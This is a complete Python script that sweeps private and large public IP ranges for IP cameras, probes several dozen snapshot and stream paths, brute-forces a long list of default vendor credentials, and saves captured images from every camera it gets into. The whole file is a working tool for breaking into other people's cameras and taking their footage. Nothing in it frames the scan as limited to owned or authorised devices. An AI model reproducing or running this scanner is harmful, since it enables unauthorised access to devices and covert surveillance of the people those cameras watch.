import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product
from datetime import datetime
import os
import urllib3
import cv2
import numpy as np
from PIL import Image
import io
import threading
import socket
import random
import ipaddress
import argparse
import time

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings()

RESULTS_FILE = "found_cameras.txt"
SCREENSHOTS_DIR = "camera_screenshots"
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
discovered = []

DEFAULT_CREDS = [
    None, 
    ('admin', 'admin'),
    ('admin', ''),
    ('admin', 'password'),
    ('admin', '12345'),
    ('admin', '123456'),
    ('admin', '1234'),
    ('admin', 'admin123'),
    ('admin', 'pass123'),
    ('admin', '11111'),
    ('admin', '54321'),
    ('admin', '111111'),
    ('admin', '666666'),
    ('admin', '1234567'),
    ('admin', '12345678'),
    ('admin', 'abc123'),
    ('admin', 'pass'),
    ('root', 'root'),
    ('root', ''),
    ('root', 'pass'),
    ('root', 'password'),
    ('root', 'admin'),
    ('root', '12345'),
    ('root', '123456'),
    ('supervisor', 'supervisor'),
    ('admin1', 'admin1'),
    ('administrator', 'administrator'),
    ('administrator', 'admin'),
    ('ubnt', 'ubnt'), 
    ('service', 'service'),
    ('support', 'support'),
    ('user', 'user'),
    ('guest', 'guest'),
    ('default', 'default'),
    ('system', 'system'),
    ('admin', '9999'), 
    ('admin', '123456789'), 
    ('hikvision', 'hikvision'),
    ('admin', 'hikvision'),
    ('admin', '12345678a'), 
    ('dahua', 'dahua'),
    ('admin', 'dahua'),
    ('admin', '888888'), 
    ('axis', 'axis'),
    ('root', 'pass'), 
    ('viewer', 'viewer'), 
    ('admin', 'meinsm'), 
    ('admin', '4321'), 
    ('foscam', 'foscam'),
    ('admin', 'foscam'),
    ('amcrest', 'amcrest'),
    ('admin', 'amcrest'),
    ('reolink', 'reolink'),
    ('admin', 'reolink'),
    ('lorex', 'lorex'),
    ('admin', 'lorex'),
    ('swann', 'swann'),
    ('admin', 'swann'),
    ('admin', 'tlJwpbo6'), 
    ('admin', 'Hikvision2020'), 
    ('admin', 'HikAdmin2020'), 
    ('admin', 'hik12345'), 
    ('admin', 'hikadmin'), 
    ('admin', 'dahua2020'), 
    ('admin', 'DahuaAdmin'), 
    ('admin', 'dh12345'), 
    ('admin', 'dahuaadmin'), 
    ('admin', 'axis2020'), 
    ('admin', 'AxisAdmin'), 
    ('admin', 'ax12345'), 
    ('admin', 'axisadmin'), 
]

CAMERA_SIGS = [
    'webcam', 'ipcam', 'netcam', 'camera', 'hikvision', 'dahua', 'axis', 'sony', 'panasonic', 
    'mobotix', 'geovision', 'vivotek', 'trendnet', 'arecont', 'bosch', 'canon', 'samsung', 
    'hanwha', 'pelco', 'avigilon', 'uniview', 'tiandy', 'watchnet', 'acti', 'infinova', 'onvif',
    'rtsp', 'foscam', 'amcrest', 'reolink', 'wyze', 'arlo', 'nest', 'ring', 'ubiquiti', 'unifi',
    'lorex', 'swann', 'flir', 'annke', 'zosi', 'honeywell', 'tplink', 'dlink', 'cisco', 'yoosee',
    'vstarcam', 'wanscam', 'milesight', 'sunba', 'microseven', 'gw security', 'laview', 'anran',
    'zxtech', 'hawk eye', 'defender', 'night owl', 'ezviz', 'floureon', 'sricam', 'besder', 'iegeek',
    'ctronics', 'gadinan', 'hiseeu', 'defeway', 'jooan', 'kerui', 'phylink', 'smonet', 'jennov',
    'hosafe', 'anspo', 'hjt', 'jidetech', 'loosafe', 'ssicon', 'xvim', 'yeskamo', 'zivif'
]

CAMERA_PATHS = [
    '/', '/index.html', '/home.html', '/main.html', '/live.html', '/stream.html', '/view.html',
    '/viewer.html', '/index.htm', '/home.htm', '/main.htm', '/live.htm', '/stream.htm', '/view.htm',
    '/viewer.htm', '/app.html', '/login.html', '/login.htm', '/mobile.html', '/mobile.htm',
    '/h264.html', '/mjpg.html', '/cgi-bin/viewer/video.jpg', '/snap.jpg', '/snapshot.jpg',
    '/capture.jpg', '/image.jpg', '/pic.jpg', '/image/jpeg.cgi', '/video.cgi', '/videostream.cgi',
    '/cgi-bin/video.cgi', '/cgi-bin/videostream.cgi', '/cgi-bin/snapshot.cgi',
    '/cgi-bin/capture.cgi', '/cgi-bin/mjpg/video.cgi', '/cgi-bin/mjpg/videostream.cgi',
    '/cgi-bin/mjpg/snapshot.cgi', '/cgi-bin/mjpg/capture.cgi', '/webcam.html', '/webcam.htm',
    '/webcam.cgi', '/webcam.jpg', '/webcam/video.cgi', '/webcam/videostream.cgi',
    '/webcam/snapshot.cgi', '/webcam/capture.cgi', '/onvif/device_service', '/onvif/media',
    '/onvif/snapshot', '/onvif/live', '/live/stream', '/live/video', '/live/mjpeg',
    '/live/snapshot', '/live/capture', '/video/stream', '/video/live', '/video/mjpeg',
    '/video/snapshot', '/video/capture', '/mjpeg/stream', '/mjpeg/video', '/mjpeg/live',
    '/mjpeg/snapshot', '/mjpeg/capture', '/stream/video', '/stream/live', '/stream/mjpeg',
    '/stream/snapshot', '/stream/capture'
]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive'
}

def capture_camera_image(url, auth=None):
    try:
        if url.startswith('rtsp://'):
            return capture_rtsp(url)
            
        if not url.startswith('http'):
            url = f'http://{url}'
            
        paths = [
            '/Streaming/channels/1/picture',
            '/cgi-bin/snapshot.cgi',
            '/snap.jpg',
            '/snapshot.jpg',
            '/image.jpg',
            '/video.cgi',
            '/image/jpeg.cgi',
            '/mjpg/video.mjpg',
            '/cgi-bin/video.jpg',
            '/live.jpg',
            '/onvif-http/snapshot',
            '/axis-cgi/jpg/image.cgi',
            '/webcapture.jpg?command=snap',
            '/media/video1/jpeg',
            '/live/ch0',
            '/live/stream',
            '/live/1/jpeg.jpg',
            '/live_stream',
            '/image1',
            '/video1',
            '/cam/realmonitor',
            '/videostream.cgi',
            '/img/snapshot.cgi',
            '/cgi-bin/camera.cgi',
            '/jpeg',
            '/picture',
            '/image',
            '/still',
            '/capture',
            '/frame',
        ]
        
        for path in paths:
            try:
                img_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                r = requests.get(img_url, timeout=2, verify=False, auth=auth, 
                               headers={'Accept': 'image/jpeg,image/png,image/*'})
                
                content_type = r.headers.get('Content-Type', '').lower()
                if r.status_code == 200 and ('image' in content_type or 'video' in content_type or len(r.content) > 1000):
                    try:
                        img = Image.open(io.BytesIO(r.content))
                        if img.size[0] < 32 or img.size[1] < 32:
                            continue
                            
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                        filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}.jpg"
                        
                        if img.mode != 'RGB':
                            img = img.convert('RGB')
                        img.save(filename, 'JPEG', quality=95)
                        
                        print(f"✓ Captured image from {img_url} -> {filename}")
                        return True
                    except:
                        continue
            except:
                continue
                
        try:
            mjpeg_paths = ['/video.mjpg', '/mjpg/video.mjpg', '/videostream.mjpg']
            for path in mjpeg_paths:
                try:
                    mjpeg_url = f"{url.rstrip('/')}/{path.lstrip('/')}"
                    r = requests.get(mjpeg_url, timeout=2, verify=False, auth=auth, stream=True)
                    if r.status_code == 200 and 'multipart' in r.headers.get('Content-Type', '').lower():
                        boundary = r.headers['Content-Type'].split('boundary=')[1]
                        content = b''
                        for chunk in r.iter_content(chunk_size=1024):
                            content += chunk
                            if b'\r\n\r\n' in content:
                                frame = content.split(b'\r\n\r\n')[1].split(boundary.encode())[0]
                                try:
                                    img = Image.open(io.BytesIO(frame))
                                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                                    safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
                                    filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_mjpeg.jpg"
                                    img.save(filename, 'JPEG', quality=95)
                                    print(f"✓ Captured MJPEG frame from {mjpeg_url} -> {filename}")
                                    return True
                                except:
                                    break
                except:
                    continue
        except:
            pass
            
        return False
    except:
        return False

def capture_rtsp(url):
    try:
        cap = cv2.VideoCapture(url)
        if not cap.isOpened():
            return False
            
        max_tries = 5
        frame = None
        for i in range(max_tries):
            ret, frame = cap.read()
            if ret and frame is not None and frame.size > 0:
                break
            time.sleep(0.1)
            
        cap.release()
        
        if frame is not None and frame.size > 0:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            safe_url = url.replace('://', '_').replace('/', '_').replace(':', '_')
            filename = f"{SCREENSHOTS_DIR}/{timestamp}_{safe_url}_rtsp.jpg"
            
            frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame_rgb)
            img.save(filename, 'JPEG', quality=95)
            
            print(f"✓ Captured RTSP frame from {url} -> {filename}")
            return True
            
        return False
    except:
        return False

def save_camera(url, reason):
    if url not in discovered:
        discovered.append(url)
        print(f"Found camera: {url} ({reason})")
        threading.Thread(target=lambda: capture_camera_image(url)).start()
        with open(RESULTS_FILE, "a") as f:
            f.write(f"{datetime.now()} - {url} - {reason}\n")

def try_auth(url, auth):
    try:
        r = requests.get(url, auth=auth, timeout=1, verify=False)
        if r.status_code == 200:
            save_camera(url, f"Auth success: {auth}")
            return True
    except:
        pass
    return False

MAX_THREADS = 1000
TIMEOUT = 0.5
QUICK_TIMEOUT = 0.2

def scan_network(network):
    ips = list(ipaddress.ip_network(network).hosts())
    random.shuffle(ips)
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        list(executor.map(scan_ip, ips))

def scan_ip(ip):
    open_ports = quick_port_scan(ip)
    if not open_ports:
        return
    with ThreadPoolExecutor(max_workers=50) as ex:
        ex.map(lambda p: check_port(ip, p), open_ports)

def quick_port_scan(ip):
    open_ports = []
    common_ports = [80, 81, 82, 83, 84, 85, 88, 443, 554, 8000, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 34567, 37777]
    
    with ThreadPoolExecutor(max_workers=100) as ex:
        def check_single_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(QUICK_TIMEOUT)
                if s.connect_ex((str(ip), port)) == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        list(ex.map(check_single_port, common_ports))
    return open_ports

def check_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        if s.connect_ex((str(ip), port)) == 0:
            with ThreadPoolExecutor(max_workers=50) as ex:
                futs = [ex.submit(quick_check_url, ip, port, path) for path in CAMERA_PATHS]
                for f in as_completed(futs):
                    if f.result():
                        break
        s.close()
    except:
        pass

def quick_check_url(ip, port, path):
    base_url = f"http://{ip}:{port}"
    url = base_url + path
    try:
        r = requests.get(url, timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
        if r.status_code in [200, 301, 302, 401, 403]:
            if any(sig in r.headers.get('Server', '').lower() for sig in CAMERA_SIGS):
                save_camera(url, "Camera server header")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if 'rtsp://' in r.text.lower():
                save_camera(url, "RTSP URL found")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if any(sig in r.text.lower() for sig in CAMERA_SIGS):
                save_camera(url, "Camera signature found")
                if r.status_code in [401, 403]:
                    threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
            if r.status_code in [401, 403]:
                save_camera(url, "Auth required - trying default credentials")
                threading.Thread(target=try_default_creds, args=(url,)).start()
                return True
    except:
        pass
    return False

def try_default_creds(url):
    for creds in DEFAULT_CREDS:
        try:
            if creds is None:
                continue
            r = requests.get(url, auth=creds, timeout=TIMEOUT, verify=False)
            if r.status_code == 200:
                save_camera(url, f"Auth success with {creds[0]}:{creds[1]}")
                capture_camera_image(url, auth=creds)
                return True
        except:
            continue
    return False

def main():
    parser = argparse.ArgumentParser()
    default_ranges = [
        '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.0.0/16',
        '192.168.1.0/24', '192.168.0.0/24', '10.0.0.0/24', '10.0.1.0/24',
        '172.16.0.0/24', '172.16.1.0/24', '192.168.2.0/24', '192.168.10.0/24',
        '192.168.20.0/24', '10.10.0.0/16', '172.20.0.0/16', '100.64.0.0/10',
        '192.0.0.0/24', '192.0.2.0/24', '198.18.0.0/15', '203.0.113.0/24',
        '8.0.0.0/8', '66.0.0.0/8', '71.0.0.0/8', '98.0.0.0/8', '108.0.0.0/8',
        '184.0.0.0/8', '216.0.0.0/8'
    ]
    
    parser.add_argument('--ranges', nargs='+', default=default_ranges,
                      help='Network ranges to scan (CIDR notation)')
    parser.add_argument('--threads', type=int, default=MAX_THREADS,
                      help='Maximum number of concurrent threads')
    args = parser.parse_args()
    
    requests.packages.urllib3.disable_warnings()
    urllib3.disable_warnings()
    
    print(f"Starting aggressive scan of {len(args.ranges)} networks with {args.threads} threads...")
    print("Default ranges:")
    for r in args.ranges:
        print(f"  - {r}")
    
    with ThreadPoolExecutor(max_workers=10) as ex:
        ex.map(scan_network, args.ranges)
        
    print("\nScan complete! Check found_cameras.txt for results")
    print(f"Screenshots saved in: {SCREENSHOTS_DIR}/")

if __name__ == '__main__':
    main()
